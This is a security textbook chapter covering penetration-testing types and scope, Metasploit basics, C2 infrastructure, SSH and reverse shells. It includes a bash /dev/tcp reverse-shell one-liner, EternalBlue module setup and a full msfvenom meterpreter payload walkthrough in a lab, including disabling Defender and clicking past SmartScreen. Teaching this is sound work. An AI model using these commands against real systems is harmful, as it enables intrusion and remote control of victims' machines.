<span class="chapter-banner">Chapter 10</span>
# Security Testing
<div class="image-crop">
  <img src="../images/10/security_tools.jpg">
</div>

**Objective**
1. Describe the types and scopes of security testing processes.
2. Perform shell and reverse shell connections.
3. Understand the components of the security testing process.
4. Conduct a penetration test against Metasploitable2.

Regular testing for vulnerabilities provides assurances to stakeholders that systems, networks, and applications are potentially free from security issues.  An entire subindustry has developed over the years where organizations hire security professionals to test the security of their systems and data.  This chapter will examine security testing processes and tools, why it is important to the management of organizations, and how security professionals perform such tests.  You will be introduced to the penetration testing topic, command and control frameworks, and how threat actors achieve remote shells onto systems.
## Security Testing Fundamentals
Organizations will engage with security professionals to evaluate the extent of security misconfigurations and vulnerabilities that are present in their systems.  Such efforts are usually demanded by stakeholders like management, customers, auditors, or regulators to provide assurance that the systems and networks are secure. Therefore, it is common to have a regularly occurring security testing process performed against the organization's systems.  The results of such tests are usually formalized within a report that demonstrates the scope and results that were achieved.
### Security Testing Types
There are several types of security testing in which organizations participate.  This textbook's Information Security chapter already described one of these security testing types related to audits.  Usually internal or external security audits center around the reconciliation of observed security controls against a framework or a standard, such as policies, procedures, laws, regulations, or guidance.  They may be performed by an audit professional and not a technical security professional; therefore, the tests conducted tend to focus on the existence and proficiency of security controls versus the discovery of vulnerabilities and misconfigurations.

The Security Systems chapter introduced the vulnerability management process most organizations perform to ensure regular security hygiene of their systems.  This process can be performed by the organization or outsourced to an external party.  A **vulnerability assessment** performed by a third party typically consists of scanning systems or networks for common misconfigurations and vulnerabilities.  They do not perform any manual testing and instead rely on the output of scanning tools to produce a report that is then made available to organization management.  The issue with vulnerability assessments is that the scanners are limited to the types of issues they can find.  They can only discover what they are programmed to do, and many vulnerabilities require special attention to be identified.  

Another type of security testing is **penetration testing**, or *pentest*, which involves the engagement of a security professional over some period of time, usually two weeks, to evaluate a system, network, or application for known vulnerabilities and misconfigurations.  Sometimes these testing efforts will discover novel security issues or attack techniques as the testing process is performed manually.  These engagements could include the testing of physical locations and buildings, which is called a *physical penetration test*.  Organization customers typically expect that at least an annual test will be performed by a qualified third party.  The tester may discover a range of security issues with a variety of severities that would be reported to the organization's management in a final report.  The organization is responsible for mitigating these issues and may re-engage the penetration tester to verify that issues are resolved.  Sometimes organizations perform penetration testing activities in-house or continuously depending on their risk tolerance and security resources.

Over the last several years **bug bounty programs** have become very popular.  These programs were developed because independent security researchers were conducting unsolicited security testing of networks and applications.  Performing such tests puts the organization and the security researcher in jeopardy as the systems being tested could be negatively impacted and the researcher held legally or criminally liable.  However, many organizations began to recognize the talent in the security community and wanted to focus it in a productive manner.  Bug bounty programs involve an incentive, usually financial, for the discovery and responsible disclosure of unique security issues.  

>[!warning] Warning - Legal Trouble
>There is legal recourse companies can take against individuals that violate terms of service or laws.  More common a couple decades ago, but not entirely extinct today, are organizations that do not welcome unsolicited security testing.  Many such organizations may even take legal action against researchers.  A few years ago, a journalist found that a state government website had exposed social security numbers within its client-side source code. [^1]  When responsibly disclosing this data leak, the state responded with threats of legal action against the journalist for "hacking".  Public outcry may have ultimately killed the state's legal response, but the attitude against responsible disclosure is still prevalent.

Organizations had to develop legal and engagement processes, marketing to security researchers, scoping criteria, and many other details that created friction in implementing such a program.  In response to this problem, a handful of bug bounty platforms sprung up that streamlined the setup process and registering of security researchers.  This structuring of the market enabled organizations to quickly implement bounty programs giving security researchers new permitted targets to test.  Also, by formalizing security researchers' efforts, they gained protection from legal prosecution while satiating their desire to perform real-world engagements.  

There are several issues associated with these bug bounty programs.  Popular targets often have the same issues discovered but only one bounty will be paid, leaving a large administrative burden on the organization to assess and compare all reported vulnerabilities.  Another criticism is the potential for abuse due to the financial incentive of vulnerabilities.  Imagine a developer purposefully introducing a vulnerability to have a friend report it and split the proceeds.

>[!info] Info - Beg Bounties
>Some "researchers" scan organization targets irrespective of bug bounty program participation and then solicit, even demand, a bounty from the company.  These individuals typically find low value security issues discovered by a scanner and email the organization requesting payment.  I would caution anyone from obliging such requests as any serious researcher would neither request a payment nor use a legitimate bug bounty program provider. 

The last security testing type is that of a **red team** test which typically lasts several weeks, months, or sometimes up to a year.  The red team test will involve a small group of highly skilled security professionals that will simulate an *advanced persistent threat* and use almost any attack method, including phishing, to gain access to systems.  These engagements are often very expensive due to the timeframe and skills needed.  They are usually very successful and go unnoticed by security alerting systems.  A report is prepared at the end of the engagement that describes the weaknesses identified for the organization to address.  The term red team, and opposite *blue team*, has its origins in the military and represents attackers (red) and defenders (blue).  Overlaying this concept on security as there are both attackers and defenders helps structure the context, type of work and systems in which security professionals are involved.  Another testing activity popularized over the last several years is the concept of **purple teaming** in which the red and blue teams work together in tandem to evaluate the security of a system.
### Testing Scope
Before a security test begins, especially for third party penetration tests, an agreement is formalized, called the *engagement letter*.  Sometimes these agreements are governed by a *master service agreement (MSA)* that provides overarching provisions of expectations between the two parties.  It includes details surrounding the work that will be performed known as the **scope**.  This usually entails information such as the dates work will be performed, the assets that will be assessed, and other information pertaining to the agreement.  It is vital that such information is documented, agreed upon, and adhered to as it protects the tester from liability.  Professional entities do not perform security testing without having an engagement letter executed as it would otherwise appear that they are attempting to compromise assets with malicious intent.

Prior to the preparation of the engagement letter, an organization must consider whether to perform the security testing in-house or to outsource it to a third party.  Both methods have their own benefits and drawbacks.  An organization may not have the talent or skills to perform a comprehensive and thorough test or may have perceived conflicts of interest.  A stakeholder, such as a customer, might not put much value in the attestation of internal testing since they would not be perceived as independent.  Another concern is that internal resources may already be constrained for time to perform such tests that would otherwise delay other work, known as an *opportunity cost*.  However, the value of performing in-house testing is that the testers are highly familiar with the environment, its people, and its processes that enable them to work very efficiently.  Furthermore, they might have the opportunity to perform tests ad hoc or for any desired duration without the consideration of additional cost outlay, as their salaries are already a *sunk cost* being spent, regardless of test.

Using a third-party testing firm absolves stakeholder concerns for conflicts of interests because the testing firm is independent of the organization's management.  These third-party firms also attract and retain highly skilled security professionals that spend the majority of their time on such engagements that may qualify their expertise over in-house personnel.  But this is not always the case, as not all security testing companies maintain high levels of expertise and an organization might not be able to fully assess the quality of the testers they are hiring.  For instance, I once hired a firm to perform a penetration test and confirmed the qualifications of the assigned tester before testing commenced.  That individual had a number of professional certifications, a lot of experience, and was well known in the security community.  Just days before the test was to start, the testing company reassigned the vetted tester with a new tester.  When I interviewed the new tester, I discovered they had less than a year of professional experience and no professional certifications.  

Another criticism of using third-party testing firms is that they are engaged for a brief period of time, usually around two weeks.  Much of this time is spent setting up and learning about the environment they are testing.  They also have to juggle multiple clients during the engagement period due to other client retesting requirements as well as follow up questions posttest.  There are other demands for their time and attention outside testing windows as they have to conceivably perform other duties for their firms, such as staff meetings and training.  Given these pros and cons of in-house versus outsourced testers, it is ideally, a mixture of the two is performed getting the best of both and compensating for each other's misgivings.

The scope of an engagement must define what is to be tested, such as the type of assets that will be tested.  Some of the most common engagements will be centered around a number of networks, web or mobile applications, or physical locations.  In a network penetration test, the tester will be provided one or more IP addresses to assess.  You could imagine these tests start with a port and service scan on each IP followed up by a version discovery and a vulnerability scan.  In a web application test, the engagement would define what domains or URLs are within the scope.  In a mobile application engagement, a test copy of the application might be provided to the tester.  Physical security tests should clearly document address locations and what areas are targeted.  In addition to detailing the targets, *objectives* must also be defined.  These objectives would detail the goals for the tester to achieve, such as obtaining domain administrator privileges, accessing a privileged page, discovering remote code execution, or accessing a server room.

>[!info] Info - Cloud Security Testing
>A subset of network tests that have become increasingly popular over the years is testing cloud environments.  These *cloud pentests* are similar to traditional network tests in concept but are tailored to cloud technologies that require an almost entirely different skillset and experience.  I highly recommend Rhino Security Labs (https://rhinosecuritylabs.com/) which has contributed to the community greatly with open-source tools and literature on cloud security testing.

Test engagements should also define the approach to the environment that is to be tested.  The approach would detail if the tests are conducted from within or outside the environment - or internal vs external to the environment.  The following diagram illustrates this concept from a network engagement, but the idea could also apply to an application or physical test.

![[../images/10/internal_external_test.png|Internal Versus External Testing|400]]

External testing, as demonstrated by the attacker outside the red dotted network boundary, provides the tester with only a public network to attack.  It is similar to the internet's perspective of the organization's network.  External tests are typically less resource intensive and costly, as the number of reachable assets is limited.  However, they also only provide an outside point of view and will exclude many vulnerabilities and misconfigurations that exist within a network.  Internal testing, represented by the attacker in the hat within the red dotted lines, provides the tester with direct access to the network.  This could include a *drop box*, such as a Raspberry Pi or laptop controlled by the tester, placed within and connected to the network, enabling them to reach internal resources behind the router or network firewall.

In addition to internal or external considerations, authentication must be determined prior to starting tests.  Unauthenticated tests, called *black box tests*, do not provide the tester with credentials to the networks, systems, or locations being tested.  This greatly limits the tester's ability to discover issues, but it does offer insights as to what an anonymous attacker could discover.  *Grey box* tests provide testers with credentials to the scoped assets giving them an insider perspective.  These tests might include low privileged, privileged, or both sets of credentials depending on the objectives of the tester.  An even more thoroughly scoped test is a *white box test* in which any internal documentation, including but not limited to source code and network topologies, is provided to the tester.  The tester uses this information to more efficiently identify areas of weakness in the assets they are testing.  Many third-party firms charge a premium for these tests as they are more laborious to execute.

> [!tip] Tip - Provide Firewall Bypass
> It is recommended to allow list tester IP addresses in security systems like WAFs and IPSs during the testing window.  This removes obstacles that might otherwise hide the root cause of security issues or waste limited and costly time.
## Frameworks
A **framework** in the context of security testing is a toolset designed to manage the assessment of targets.  It provides the tester with a suite of tools that can identify and exploit targets but also to manage the sessions from compromised endpoints.  Typically, these tools can handle a high volume of compromised devices.  Once an endpoint is compromised, additional tools within the framework are available to extend post exploitation techniques including moving laterally within compromised networks.  Along the way, the framework logs activity and results to support findings and to generate reports.

There are many frameworks a tester can use that range from free to use to commercial and paid.  Like many other security research and tools, frameworks are useful to both security professionals as well as malicious actors.  Metasploit, now owned by the company Rapid7, is one of the most popular frameworks due to its large feature set, community support, and corporate investment.  It comes pre-installed within Kali Linux operating systems and is a great introduction to the power of these frameworks.

>[!activity] Activity 10.1 - Metasploit Basics
>The Metasploit framework has verbose documentation published on https://docs.metasploit.com/ that explains the modules included within the framework and the toolset's basic usage.  Metasploit is divided into the following *modules*:
>- **Auxiliary** - performs tasks, such as scanning
>- **Encoder** - converts data into specified encodings
>- **Evasion** - tools to bypass security monitoring like antivirus
>- **Exploit** - executes payloads that leverage vulnerabilities to achieve code execution
>- **Payload** - encapsulates shellcode used within exploit modules
>- **Post** - tasks for gathering, collecting or enumerating compromised endpoints
>Readers are encouraged to explore Metasploit's rich documentation that explains its architecture, basic usage, and ways to contribute.  In this activity, I will demonstrate starting and navigating Metasploit before we use it again in other activities within this chapter.
>
>After starting my Kali VM and launching a terminal, I launch Metasploit using the following command.
> ```bash
> sudo msfdb run
> ```
> ![[../images/10/basics_activity_msf_start.png|Starting Metasploit Framework on Kali|500]]
> The first time launching Metasploit creates a database which is used to store testing information.  Framework users can create new databases for each engagement they are on to keep interests separate from each other.  
> ![[../images/10/basics_activity_msf6.png|Metasploit Fully Loaded|500]]
> After waiting a minute for the database to initialize, we are presented with some ASCII art that changes each time the tool is started, and the `msf6` command line, known as the console.  Metasploit is a command line tool that uses its own command prompt with built-in commands.  The best command to learn first is the `help` command as it will display a description of all other commands.
> ```
> help
> ```
> ![[../images/10/basics_activity_help.png|Metasploit Help Menu|500]]
> The help menu organizes commands in sections that include Core Commands, Module commands, Job Commands, as well as a few others.  Core Commands help with administering the console and includes commands such as `set` that assigns a given value to a variable, `quit` which exits the console, and `sessions` that list all the available sessions created.  The following list from the help menu describes all available commands.
> ![[../images/10/basics_activity_core.png|Metasploit Core Commands|500]]
> The next section of the help menu is the Module Commands section.  These commands are used to find, select and navigate modules within the framework.  The `info` command describes information about a module, whereas the `search` command can help find a module by keywords.  Other useful module commands are `use` which selects a module, `options` that display the configuration for the module, and `back` to exit out of the module.
> ![[../images/10/basics_activity_module.png|Metasploit Module Commands|500]]
> I will demonstrate the navigation of Metasploit by searching for modules related to SMB, which is a popular Windows protocol for sharing remote services like printers and files.  Using the search command with keyword SMB, a list of all the modules in Metasploit are displayed.
> ```
> search smb
> ```
> ![[../images/10/basics_activity_search.png|Searching SMB In Metasploit|700]]
> The search reveals over one hundred modules with the keyword SMB in its name or description.  It produced a list of modules from auxiliary, post-exploitation, and exploit categories.  I will refine my search to identify modules related to the Eternal Blue vulnerability and exploits.  Eternal Blue was made famous through its use in WannaCry ransomware, as well as the story behind its discovery being leaked by a threat actor that hacked the NSA and leaked it online.  The exploit leverages particular weaknesses in SMB to achieve remote code execution as the System user.
> ```
> search eternal
> ```
> ![[../images/10/basics_activity_eternal_search.png|Searching Eternal Blue Exploits In Metasploit|500]]
> This list of modules includes the Eternal Blue exploit that I am searching for.  To select it, I issue the `use` command while specifying the relative index number in the first column or the full path name of the module.
> ```
> use 0
> use exploit/windows/smb/ms17_010_eternalblue
> ```
> ![[../images/10/basics_activity_use_eternal.png|Selecting Eternal Blue Module|600]]
> Upon selecting the module, the console description appends the name of the module to the command line evidencing that the module is selected.  Before I configure the Eternal Blue module, I need to identify which variables it needs to have set.  Running the `options` command displays each variable along with if it is required, its current value, and a brief description.
> ```
> options
> ```
> ![[../images/10/basics_activity_options.png|Eternal Blue Options|600]]
> You may have noticed between running the use and options commands that Metasploit logged a "No payload configured" message to the console and that a payload was automatically assigned.  This module requires the use of a payload module which also has settings that are displayed after running options.  The payload options LHOST and LPORT are used to instruct Metasploit where to establish a reverse connection, known as a *listener*.  We have used listeners such as Netcat in other chapters of this textbook, but Metasploit also has the capability of setting them up.  We will explore listeners and payloads later in this chapter, but their configuration is worth noting here.
> ![[../images/10/basics_activity_payload_options.png|Payload Options For Eternal Blue|500]]
> The Eternal Blue module needs to be instructed which asset to target.  The "R" in "RHOSTS" and "RPORT" stands for remote and is used to specify the target to attack.  I will need to set RHOSTS because it is currently blank and is required. 
> ```
> set RHOSTS 192.168.1.5
> options
> ```
> ![[../images/10/basics_activity_set_rhosts.png|Setting RHOSTS For Eternal Blue|500]]
> Running the options command again I can see that RHOSTS is no longer blank!  Once all required settings are configured, and a listener is setup (which it currently is not), the exploit module can be launched using the `run` or the `exploit` commands.

While Metasploit generally focuses on the compromise of targets, other frameworks are built to optimize **command and control (C2)** through the use of agents.  A free and opensource C2 framework is Covenant, whereas a common and often abused commercial grade framework is Cobalt Strike.  This type of framework is explored in more detail within the following section.
### Command and Control
Red teamers as well as serious threat actors utilize frameworks, such as Covenant or Cobalt Strike to manage their compromised victims on server infrastructure.  In a full-scale operation, these frameworks are installed on servers that the attackers remotely operate.  Usually, frameworks in this scenario are not run directly from an attacker's workstation or laptop as they require an internet facing service for victims to connect.  An attacker's workstation may not be powerful enough to handle all of the connections.  In addition, maintaining direct connections from victims to an attacker's laptop is considered poor *operational security (opsec)* as it could directly expose their device to defenders.  The following diagram depicts the most basic setups where multiple victims connect to the attacker's C2 infrastructure that hosts framework software.

![[../images/10/c2_basic.png|Basic C2 Infrastructure|400]]

This server organizes and manages these incoming connections enabling the attacker to remotely manage the victim's device.  The attacker logs into the C2 server, over SSH for example, and is able to send instructions to victims from the server.  Prior to the C2 server setup, the attacker may register internet domains to be used in phishing and other attacks.  Many security systems will not trust newly registered domains, especially if they are being used for email because of the historic abuse by malicious actors.  Therefore, a wise attacker will procure a domain or public IP address that has an established history and reputation, or they might attempt to build a positive reputation for a newly created domain prior to using it for malicious purposes.  

These domains and their positive reputations are an important asset to the attacker that they would wish to retain.  If an IP address loses its reputation and is blocked by security tools for known to be malicious, the attacker can procure a new IP address and update DNS records for their domain.  The server itself may also be an important asset to the attacker as it takes time and money to establish.  However, victims and defenders can easily identify the public IP address or domain of the C2 server.  Often these malicious IPs and domains make their way into opensource reputation lists that are fed into security tools such as IDS/IPS and firewalls.  Once an IP or domain makes its way into one of these lists and applied as a fed into security tools, attacks can be thwarted as traffic will be blocked on the victim's device or network.

To protect their attacking infrastructure investments, scale their capabilities, and build stronger opsec, the attacker will layer their infrastructure in a manner that allows for the loss of a C2 server without causing a complete infrastructure take down.  This has the benefit of hiding additional infrastructure assets from authorities and defenders and is an example of an *anti-analysis* technique.  In the following diagram, the C2 servers that victims directly connect to acts as a *reverse proxy* and *load balancer* that will analyze and validate incoming requests before forwarding the requests to deeper infrastructure, such as a file server, phishing site, or framework like Cobalt Strike or Covenant.

![[../images/10/c2_advanced.png|Advanced C2 Infrastructure|500]]

The reverse proxy C2 server can validate victim traffic in a number of ways.  One validation technique is to assess an HTTP header with a predefined token.  Any requests that do not include the token would be dropped as they may be deemed unsolicited, perhaps by a security defender.  This is another example of anti-analysis techniques attackers apply at the network level.  These efforts allow the attacker to evade detection or to avoid their tools and malware from being obtained by security defenders for further analysis.  Should these reverse proxies be discovered, blocked or taken down by defenders, the attacker can quickly rebuild the reverse proxy C2 server while retaining the other infrastructure behind it, making it far less burdensome than having to rebuild everything.

Victims communicate with frameworks using an *agent* that has been installed on the compromised device.  This malicious software is often classified as a *trojan* while having the unique characteristic of a resilient connection to the C2 servers.  Instead of establishing and maintaining a persistent TCP/IP connection to the C2 server, the agent periodically reaches out to the C2 server to inspect if there are any instructions to follow.  The frequency and jitter of these connections can be randomized to avoid clear patterns that may be more easily detected by defenders.  But they all generally work the same where the agent installed on the victim device makes an outbound connection to an internet facing C2 server in order to check if there is a pending command configured by the attacker.  If there is no command, the agent sleeps for some period of time before attempting again.

![[../images/10/c2_agents.png|C2 Agent Communication Flow|550]]

When the attacker is ready to have a victim or group of victims perform some task, such as a *distributed denial of service (DDoS)* attack, they log into the framework C2 and insert a command.  When the agents eventually check in, they see the command and execute it.  After the victim executes the command, the results are returned to the C2 and then the querying starts over.  In the next section we will explore shells and *reverse shells* that work similarly to agents.
## Shells
The interface where a user can enter commands to a computer is often referred to as a shell, terminal, console, or command line interface.  However, each of these terms have a technical difference and distinguishable meaning.  While it is common to use them interchangeably, as I have and will continue to in this textbook, it is beneficial to know their differences.  A **shell** is a computer program that provides a text only interface and is used to give the machine instructions to run other programs.  The **command line interface (CLI)**, or prompt, is part of the shell that starts with the blinking cursor where the shell user enters commands.  **Terminal** and **console** have their roots in the early days of networked computing where a device, the console, was connected to a mainframe via an interface, the terminal.

> [!info] Info - Shell Options
> The most common shells for Unix and Linux operating systems are variants of the *Bourne shell (sh)* command line interpreter which is often installed by default.  Other common shells that perform similarly to the Bourne shell are Bash and the Z shells (zsh).

Shells offer a convenient way to interact with a computer that has low overhead relative to a GUI.  Another feature is the ability to group commands together with logic into *scripts* which can automate tasks improving quality and efficacy.  One more profound capability of shells is that they can be used locally or remotely.  Remote shells empower administrators and system users to connect to a device from anywhere over a network as if they were sitting in front of the device.  However, before a remote shell connection can be made, the remote device must be appropriately configured with a shell service that interacts with the networking stack.  This creates an open port and an interactive shell service pending incoming connections. 
### Remote Shells
The security of remote shells is very important since it makes the remote device accessible to users on a network.  Common forms of security for remote shells are authentication, such as requiring a username and password before admitting a shell connection, and encryption, in which the network traffic is protected from manipulation and eavesdropping.  Advanced security measures for remote shell connections include using a *restricted shell* or *jail*.  The commands or binaries available within these shells are limited to the remote user which provides enhanced security by reducing the attack surface of the shell.

> [!warning] Warning - Using Non-Default Remote Management Ports for Security
> Some administrators will establish remote management ports on non-default numbers expecting that the service will not be discovered.  Such efforts are trivially bypassed by a simple port scan and provide little to no real security protection.  This type of effort is called *security through obscurity*, which is a technique used to hide vulnerabilities from being discovered.

A common remote shell protocol and application is Telnet, however it should be avoided.  Even though Telnet on port 23 has authentication features built-in, it does not support encryption, leaving it susceptible to MitM attacks.  Alternatively, the *Secured Shell (SSH)* protocol over port 22 offers enhanced authentication methods, such as the use of key-based authentication instead of passwords, while also supporting AES encryption.  Microsoft Windows also supports secured remote shells over their proprietary Windows Remote Manager (WinRM) on ports 5985 and 5986.  The following diagram depicts the most basic of SSH connections where a client establishes a remote session with a device that has a listening SSH service.

![[../images/10/shell_ssh.png|Basic SSH Connection|275]]

>[!activity] Activity 10.2 - SSH Connection
>To demonstrate SSH, I will set up the Ubuntu VM as an SSH server and then connect to it using the Kali VM; both VMs are required to be on the same network using Bridge Adapter network modes.
>
>After starting the Ubuntu machine and launching a terminal, I check to see what network sockets the machine has listening.  You can think of these as being discoverable by an NMAP port scan by another device.  Using the Socket Statistics (`ss`) command shows the available sockets on the host machine.
>```bash
>ss -ant
>```
>![[../images/10/ssh_activity_ss.png|Socket Statistics On Ubuntu|500]]
>From the ss command I see that TCP ports 631, 53, 80, and 443 are listening.  Ports 80 and 443 are related to the Web Application Defense chapter's activity where we set up and secured the Apache web server.  The other ports came preconfigured when I installed Ubuntu.  But what I do not see is the secure shell (SSH) remote management port 22 open, so I install OpenSSH using the following command.
>```bash
>sudo apt install openssh-server -y
>```
>![[../images/10/ssh_activity_openssh.png|Installing OpenSSH on Ubuntu|500]]
>Once OpenSSH is installed, I start the SSH service and check its status that shows the daemon is active and running without error.
>```bash
>sudo systemctl start ssh
>systemctl status ssh
>```
>![[../images/10/ssh_activity_start_ssh.png|Starting SSH Service on Ubuntu|500]]
>Checking Socket Statistics again now shows that port 22 is open to network connections!
>```bash
>ss -ant
>```
>![[../images/10/ssh_activity_ss_confirmed.png|Socket Statistics Port 22 Listening|500]]
>Before I attempt to connect to the Ubuntu VM over SSH from Kali, I will need to know the Ubuntu IP address using the `ip` command.  In my case, the IP address is found to be 192.168.4.169.
>```bash
>ip a
>```
>![[../images/10/ssh_activity_ip.png|Ubuntu VM's IP Address|500]]
>After starting the Kali VM, logging in, and opening a terminal, I run the preinstalled SSH client software to connect to the Ubuntu VM.  This command requires the use of `sudo`, as it establishes a new network connection.  The command syntax for SSH is "username" at "IP address" as demonstrated in the following command.
>```bash
>sudo ssh daniel@192.168.4.169
>```
>![[../images/10/ssh_activity_connect.png|SSH Connection to Ubuntu From Kali|500]]
>After entering the command, the Kali VM prompts me for the Kali `daniel` user password, since I am using `sudo`.  Then, SSH instructs me that the Ubuntu host I am seeking to connect to does not have a local asymmetric key associated with it and asks me if I trust the host and public key provided by Ubuntu.  I enter `yes` which adds the key to my local `known_hosts` file to be trusted in the future.  The next SSH session I make with Ubuntu will not prompt me again unless the keys are rotated.
>
>Once I enter yes, I am prompted to provide the password for the `daniel` user on the Ubuntu VM.  I then enter the password for the user, and I am greeted with the Ubuntu terminal's "message of the day" and provided a command line interface!  My shell is transformed to `daniel@154-ubuntu` indicating that my terminal to the Ubuntu shell is ready for commands.
>
>I can now enter commands directly on the Ubuntu VM from my Kali VM's terminal that made the SSH connection.  The following commands demonstrate this capability.
>```bash
> whoami
> uname -a
> ip a
>```
>![[../images/10/ssh_activity_remote_commands.png|Remote Commands From Kali On Ubuntu|500]]

### Reverse Shells
Most networks and devices are protected with firewalls that effectively close any open ports and block services, unless purposefully opened.  Doing so prevents remote management services like SSH or Telnet from being exposed to networks.  However, devices within a protected network are still able to reach out to internet resources, assuming that the network firewalls do not block outbound connections.  By default, most firewalls and routers will block all inbound ports and allow any outbound connections.  The following diagram demonstrates the blocking of inbound connections from the internet while allowing network devices to reach internet resources.

![[../images/10/reverse_shell.png|Hardened Network|300]]

Building on the topic of remote shells, in which a remote user can connect to another device using a shell program, a **reverse shell** establishes a connection generated from the remote system to the user's system.  This method of connection is popular among malicious actors for a few reasons.  Many times, a victim device does not have a remote management protocol, such as SSH or WinRM, enabled or reachable from outside the network.  In order for the attacker to achieve a remote terminal connection, they set up a server or listener and have the remote victim device connect to the attacker.  Illustrating this connection method in the following diagram, the client connects to the attacker through their network and firewall since outbound connections are allowed by default.

![[../images/10/reverse_shell_connection.png|Victim Reverse Shell Connection|300]]

There are several native technologies that an attacker can leverage on a victim device, called *living off the land binaries (LOLBINS)*.  For example, bash can establish a remote shell using the following command `bash -i >& /dev/tcp/10.0.0.1/8080 0>&1` where `10.0.0.1` is the remote server and `8080` is the port being connected.  Almost any scripting language can create arbitrary outbound connections so there are many reverse shells *one-liners* like the bash command above.  PentestMonkey's Reverse Shell Cheat Sheet (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet) lists several programs that can be used to generate such connections.  A reverse shell can be achieved on a victim device if the attacker can run *remote code execution (RCE)* exploits, arbitrary commands, or if they are able to get the victim user to run malicious software, such as a *trojan*.  

> [!activity] Activity 10.3 - Reverse Shell
> Metasploit comes with a utility called Msfvenom that is used to generate payloads, or executables, that will establish a connection to a Metasploit listener running on an attacker's machine.  You could think of the Msfvenom payloads as reverse shell executables that could be sent to a victim user in a phishing email, or by some other method.  
> 
> In this activity, I will demonstrate how to generate an Msfvenom payload, set up a Metasploit listener, and simulate a victim's execution of the malware using the Windows and Kali VMs.  It is important that both machines are on the same network as they will need to reach each other in order for the reverse shell to be made.
>  ![[../images/10/rev_activity_av.png|Launching Windows Defender Settings|400]]
>  Windows Defender will quickly identify the Msfvenom payload as malware so I will disable the antivirus for the sake of the demonstration.  Note that there are several methods to bypass antivirus that exceed the scope of this demonstration, but that we covered in an earlier chapter.  After starting the Windows VM, I navigate to the "Virus & threat protection" system settings using the search menu.  Then I press "Manage settings" under the Virus & threat protection settings section to launch the setting options window.
>  ![[../images/10/rev_activity_settings.png|Defender Manage Settings|450]]
>  With the Settings window launched, I flip the "Real-time protection" setting to disable.  This will turn Defender off and prevent the blocking of the Msfvenom payload used later.  However, the next time the Windows machine reboots, Real-time protection will be automatically flipped back on.
>  ![[../images/10/rev_activity_disabled.png|Disabled Windows Defender|450]]
>  Jumping over to the Kali VM and launching a terminal, I check Kali's IP address using the IP command.  The Kali IP address 192.168.4.167 will be needed to configure the Msfvenom payload.
>  ```bash
>  ip a
>  ```
>  ![[../images/10/rev_activity_ip.png|Kali IP Address|600]]
>  Msfvenom comes preinstalled in Kali, so it is ready to use.  Running the following command lists the hundreds of supported payloads.  It takes a moment to run but displays various shell, command, and system options.  
>  ```bash
>  msfvenom --list payloads
>  ```
>  ![[../images/10/rev_activity_payloads.png|Msfvenom Payload Options|600]]
>  Some of these payloads are bind shells, while others are reverse shells.  A bind shell is a program that turns the victim into a server with a listening port and service for the attacker to connect to.  Another option to understand is staged versus stageless payloads.  Staged payloads use the syntax `type_method_protocol` while stageless have the syntax `type/method_protocol`.  Notice the slight variation of two underscores versus one.  A staged payload is smaller in file size and will download a second temporary executable to run it.  The stageless payloads are larger and perform all actions in one execution.  The last payload option to consider is shell versus meterpreter.  A shell can be used with any listener, such as Netcat, and is light weight, whereas a meterpreter payload is designed to be used with the Metasploit listener.  Meterpreter comes with many extended features such as upload/download and privilege escalation built-in commands.   
>  
>  Because I will be targeting a Windows 64-bit system that creates a reverse shell, I select the `windows/x64/meterpreter/reverse_tcp` payload to use in my Msfvenom generation.  I must also specify the listening host (192.168.4.167) and port (9001), executable filetype (exe) and the output file (runme.exe).  The following command creates the Msfvenom payload in my current folder.
>  ```bash
>  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.4.167 LPORT=9001 -f exe -o runme.exe
>  ```
>  ![[../images/10/rev_activity_msfvenom.png|Payload Generated On Kali|600]]
>  I will need the victim to download this executable so I set up a Python HTTP webserver using the following command.
>  ```bash
>  python3 -m http.server 80
>  ```
>  ![[../images/10/rev_activity_webserver.png|Python Web Server To Deliver Payload|600]]
>  But before I have the victim download the file, I need to set up Metasploit with a listener to catch the reverse shell.  I launch another terminal in the Kali VM and run the following command to start Metasploit.
>  ```bash
>  sudo msfdb run
>  ```
>  ![[../images/10/rev_activity_start_msf.png|Starting Metasploit|600]]
>  Once Metasploit is started, I load the multi handler module which will be used to start a listener.
>  ```bash
>  use exploit/multi/handler
>  ```
>  ![[../images/10/rev_activity_load_handler.png|Load Multi-Handler Module In Metasploit|600]]
>  Notice the information message that the `generic/shell_reverse_tcp` payload was automatically selected.  This does not match the payload that I already created using Msfvenom, so I set the correct payload with the following command.
>  ```
>  set payload windows/x64/meterpreter/reverse_tcp
>  ```
>  ![[../images/10/rev_activity_payload_set.png|Setting Windows Payload In Multi-Handler|600]]
>  With the correct payload set, I next need to configure its listening host and port to match the Msfvenom payload attributes used earlier.
>  ```
>  set LHOST 192.168.4.167
>  set LPORT 9001
>  ```
>  ![[../images/10/rev_activity_configure_listener.png|Configuring Listener|600]]
>  The last step for setting up the listener is to run it with either the run or the exploit command.
>  ```
>  run
>  ```
>  ![[../images/10/rev_activity_run_listener.png|Run Configured Multi-Handler|600]]
>  With the Msfvenom payload executable generated, HTTP server ready to serve it, and the Metasploit multi handler listener running, I am ready to spring the attack on the victim.  Jumping back to the Windows VM and pretending to be the victim, I open a browser and navigate to `192.168.4.167` to see the files being served by the attacker.  I press the `runme.exe` file to start the download.
>  ![[../images/10/rev_activity_files.png|Victim Payload Download|400]]
>  Microsoft Edge immediately detects that the file is an executable and blocks the download.  To overcome this, I tell Edge to keep the file regardless.
>  ![[../images/10/rev_activity_edge_bypass.png|Bypassing Edge Warning|300]]
>  As soon as I press the Keep option, Microsoft SmartScreen identifies that the downloaded executable has not been signed with a reputable certificate.  I tell SmartScreen to "Keep anyway" under the "Show more" dropdown to complete the download.
>  ![[../images/10/rev_activity_smartscreen_1.png|Edge SmartScreen Warning|250]]
>  Finally, the runme.exe file is in my downloads folder.
>  ![[../images/10/rev_activity_downloaded.png|Runme.exe In Downloads Folder|250]]
>  Double clicking the file immediately triggers another SmartScreen warning, this time because the executable has the "mark of the web" in its properties.  Clearly, Microsoft has learned about this attack vector and has put many obstacles in place to prevent a user from running malicious software from the internet!
>  ![[../images/10/rev_activity_smartscreen_2.png|SmartScreen Block At Running|300]]
>  I press the "More info" link which enables the "Run Anyway" button at the bottom of the Window.  Pressing this button will trigger the reverse shell connection.  You might be wondering how practical such an attack would be given all the security warnings implemented by Microsoft.  Each of these have multiple bypasses that could be deployed while some could be avoided altogether.  Such bypasses exceed the scope of this activity and interested readers are encouraged to research on their own.
>  
